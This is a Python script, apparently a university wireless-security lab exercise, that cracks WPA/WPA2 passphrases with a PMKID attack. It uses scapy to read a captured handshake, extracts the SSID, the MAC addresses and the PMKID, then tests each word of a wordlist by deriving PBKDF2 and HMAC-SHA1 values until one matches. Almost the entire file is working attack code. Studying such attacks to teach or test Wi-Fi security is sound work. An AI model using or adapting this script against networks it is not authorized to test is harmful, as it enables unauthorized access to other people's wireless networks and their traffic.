#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

PMK_NAME = b"PMK Name"

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

assocRequests = []
# get info from every association requests (ssid, APMac, ClientMAC)
def getAssocReqInfo(packets):
    for p in packets:
        if p.haslayer(Dot11): 
            if p.type == 0 and p.subtype == 0 :
                ar_ssid = p.info.decode('ascii')
                ar_APmac = p.addr1
                ar_Clientmac = p.addr2
                assocRequests.append((ar_ssid, ar_APmac, ar_Clientmac))

# get the first handshake message for the specified AP-STA pair
def getPMKIDFromFirstHandshakeMessage(packets, apmac, climac):
    for p in packets:
        #AP to STA (handshake#1 and handshake#3)
        if p.haslayer(WPA_key) and p.addr2 == apmac and p.addr1 ==climac:
            return getPMKIDFromPacket(p)

    # Return 0 if AP-STA pair hasn't started handshake
    return 0
            


# With Wireshark we can easily see that PMKID are the 16 bytes before the 4 leas bytes
def getPMKIDFromPacket(packet):
    return raw(packet)[-20:-4]


def attack(expected_pmkid, infos):
    words = open('superdico.txt', 'r').readlines()
    
    for word in words:
        word = word.strip()
        passPhrase = word.encode()
        ssid = infos[0].encode()
        apmac = a2b_hex(infos[1].replace(':', ''))
        climac = a2b_hex(infos[2].replace(':', ''))
        
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
        computed_pmkid = hmac.new(pmk, PMK_NAME + apmac + climac, hashlib.sha1)

        # So we only take the first 16 bytes
        if computed_pmkid.digest()[:16] == expected_pmkid:
            print("Found result with passphrase '"+ word +"' on the network with SSID " + ssid.decode()) 

    return


def main():    
    #Association Request Info
    getAssocReqInfo(wpa)
    for infos in assocRequests:
        pmkid = getPMKIDFromFirstHandshakeMessage(wpa, infos[1], infos[2])
        
        if pmkid != 0:
            attack(pmkid, infos)

if __name__ == "__main__":
    main()